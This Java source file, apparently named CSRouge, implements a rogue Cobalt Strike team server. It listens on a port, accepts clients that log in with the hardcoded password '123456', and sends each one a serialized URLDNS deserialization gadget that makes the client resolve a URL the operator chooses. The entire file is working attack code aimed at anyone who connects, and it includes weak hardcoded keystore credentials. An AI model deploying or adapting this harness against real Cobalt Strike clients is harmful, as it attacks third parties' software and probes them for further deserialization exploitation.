import java.net.Socket;
import java.net.SocketException;


/**
 * -Djavax.net.ssl.keyStore=./cobaltstrike.store
 * -Djavax.net.ssl.keyStorePassword=123456
 */

public class CSRouge {
    public static void main(String args[]) throws Exception {
        if (args.length<2){
            System.out.println("input lister port and url");
            System.exit(0);
        }
        Integer port = new Integer(args[0]);
        String url = args[1];
        SecureServerSocket var3 = new SecureServerSocket(port);
        System.out.println("lister........");
        //System.out.println(var3.fingerprint());
        while(true) {
            var3.acceptAndAuthenticate("123456", new PostAuthentication() {
                public void clientAuthenticated(Socket var1) {
                    try {
                        var1.setSoTimeout(0);
                        TeamSocket var2 = new TeamSocket(var1);
                        var2.writeObject(UrlDns.getObject(url));
                    } catch (SocketException e) {
                        e.printStackTrace();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
        }
    }
}
